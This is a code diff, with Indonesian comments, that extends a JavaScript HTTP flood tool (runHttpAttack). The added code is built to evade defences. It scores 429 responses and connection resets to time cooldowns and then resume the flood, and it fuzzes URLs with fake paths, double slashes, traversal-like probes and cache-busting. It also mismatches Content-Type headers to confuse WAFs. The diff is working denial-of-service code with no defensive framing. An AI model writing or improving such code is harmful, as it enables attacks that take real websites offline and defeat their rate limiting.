@@ -24,6 +24,12 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     const ORIGINAL_MAX_STREAMS = 250; // Intensitas dinaikkan sedikit sesuai permintaan
     const MIN_STREAMS = 25; // Batas bawah juga diturunkan
 
+    // --- Sistem Pertahanan Anti-Limiter Kompleks ---
+    let limiterScore = 0;
+    let isCoolingDown = false;
+    const LIMITER_THRESHOLD = 20; // Skor untuk memicu mode "cool down"
+    const LIMITER_SCORE_DECAY = 0.75; // Skor meluruh 25% setiap 5 detik
+
     // --- Kontrol Memori Otomatis untuk Mencegah "Out of Memory" ---
     // Setel batas "aman" di bawah batas heap sebenarnya (--max-old-space-size=1024) untuk memberikan ruang.
     const HEAP_SAFE_LIMIT_MB = 800; 
@@ -54,16 +60,18 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     const fuzzUrl = (originalUrl) => {
         let finalUrl = originalUrl;
         const fuzzChoice = Math.random();
+        const urlObj = new url.URL(originalUrl);
 
-        if (fuzzChoice < 0.1) { // 10% chance to add a fake path
+        if (fuzzChoice < 0.1) { // 10% - Tambah path palsu
             const fakePath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
-            finalUrl = new url.URL(fakePath, originalUrl).href;
-        } else if (fuzzChoice < 0.25) { // 15% chance to add a fake query
+            urlObj.pathname = fakePath;
+            finalUrl = urlObj.href;
+        } else if (fuzzChoice < 0.2) { // 10% - Tambah parameter palsu
             const fakeParam = commonParams[Math.floor(Math.random() * commonParams.length)];
             const fakeValue = crypto.randomBytes(8).toString('hex');
-            finalUrl += (finalUrl.includes('?') ? '&' : '?') + `${fakeParam}=${fakeValue}`;
-        } else if (fuzzChoice < 0.35) { // 10% chance to inject a path segment
-            const urlObj = new url.URL(originalUrl);
+            urlObj.searchParams.append(fakeParam, fakeValue);
+            finalUrl = urlObj.href;
+        } else if (fuzzChoice < 0.3) { // 10% - Sisipkan segmen di path
             let pathSegments = urlObj.pathname.split('/').filter(Boolean);
             if (pathSegments.length > 1) {
                 const injectIndex = 1 + Math.floor(Math.random() * (pathSegments.length - 1));
@@ -71,8 +79,18 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
                 urlObj.pathname = '/' + pathSegments.join('/');
                 finalUrl = urlObj.href;
             }
+        } else if (fuzzChoice < 0.4) { // 10% - Tambahkan double slash
+            if (urlObj.pathname.length > 1) {
+                urlObj.pathname = urlObj.pathname.replace('/', '//');
+                finalUrl = urlObj.href;
+            }
+        } else if (fuzzChoice < 0.5) { // 10% - Tambahkan path traversal-like probe
+            if (urlObj.pathname.length > 1) {
+                urlObj.pathname += '/../';
+                finalUrl = urlObj.href;
+            }
         }
-        // 65% sisanya menyerang URL asli (dengan cache-busting di bawah)
+        // 50% sisanya menyerang URL asli (dengan cache-busting di bawah)
 
         const cacheBustingParam = `_=${crypto.randomBytes(6).toString('hex')}`;
         return finalUrl + (finalUrl.includes('?') ? '&' : '?') + cacheBustingParam;
@@ -91,8 +109,19 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
             activeRequests--;
         };
         const onError = (error) => {
-            // Jangan hitung error jika permintaan dibatalkan secara sengaja (mis. saat stop)
-            if (!axios.isCancel(error)) {
+            if (axios.isCancel(error)) {
+                return; // Bukan error, permintaan dibatalkan secara sengaja.
+            }
+
+            // --- Logika Skor Anti-Limiter ---
+            if (error.response && error.response.status === 429) {
+                limiterScore += 5; // Sinyal kuat, penalti besar
+                console.warn(`Worker ${process.pid} received 429 (Too Many Requests). Increasing limiter score to ${limiterScore}.`);
+            } else if (error.code === 'ECONNABORTED' || error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
+                limiterScore += 1; // Sinyal lemah, penalti kecil
+            } else {
+                // Hanya hitung error yang benar-benar tak terduga (mis. masalah DNS, proxy, dll).
+                // Timeout dan reset koneksi dianggap sebagai perlawanan dari target.
                 localError++;
             }
         };
@@ -101,10 +130,16 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
             const { payload, type } = getRandomPayload();
             let data = payload;
             if (type === 'json') {
-                // Axios handles JSON objects automatically
+                // 15% chance to send with wrong Content-Type to confuse WAF/backend
+                if (Math.random() < 0.15) {
+                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                }
             } else { // 'form'
-                // Axios handles URLSearchParams for form data
                 options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                // 15% chance to send with wrong Content-Type
+                if (Math.random() < 0.15) {
+                    options.headers['Content-Type'] = 'application/json';
+                }
             }
             axios.post(finalUrl, data, options).catch(onError).finally(onComplete);
         } else {
@@ -114,6 +149,34 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
  
     const attackLoop = () => {
         if (!isAttackActive) return;
+
+        // --- Logika Pertahanan Anti-Rate-Limiter ---
+        if (!isCoolingDown && limiterScore > LIMITER_THRESHOLD) {
+            isCoolingDown = true;
+            const cooldownDuration = 5000 + Math.random() * 5000; // Cooldown selama 5-10 detik
+            console.warn(`Worker ${process.pid} detected rate limiting (score: ${limiterScore}). Entering ${Math.round(cooldownDuration / 1000)}s cooldown.`);
+            
+            // Paksa masuk ke mode jeda dan reset stream
+            attackState.phase = 'PAUSE';
+            attackState.streams = MIN_STREAMS;
+            
+            setTimeout(() => {
+                console.log(`Worker ${process.pid} finished cooldown. Resuming attack.`);
+                limiterScore = 0; // Reset skor setelah cooldown
+                isCoolingDown = false;
+                attackState.phase = 'RAMP_UP'; // Mulai lagi dari awal
+                attackState.phaseEndTime = Date.now() + 1000;
+            }, cooldownDuration);
+        }
+
+        // Jika sedang dalam mode cooldown, pertahankan serangan minimal dan jangan jalankan logika pacing normal.
+        if (isCoolingDown) {
+            while (isAttackActive && activeRequests < MIN_STREAMS) {
+                attack();
+            }
+            setTimeout(attackLoop, 100); // Periksa kembali setelah 100ms
+            return;
+        }
 
         // Terapkan Algoritma Pacing Cerdas
         if (Date.now() > attackState.phaseEndTime) {
@@ -162,6 +225,11 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
 
     // Lapor statistik secara berkala setiap 5 detik
     const statsInterval = setInterval(() => {
+        // Luruhkan (decay) skor limiter seiring waktu
+        if (limiterScore > 0) {
+            limiterScore = Math.floor(limiterScore * LIMITER_SCORE_DECAY);
+        }
+
         if (process.send) {
             process.send({
                 type: 'stats',
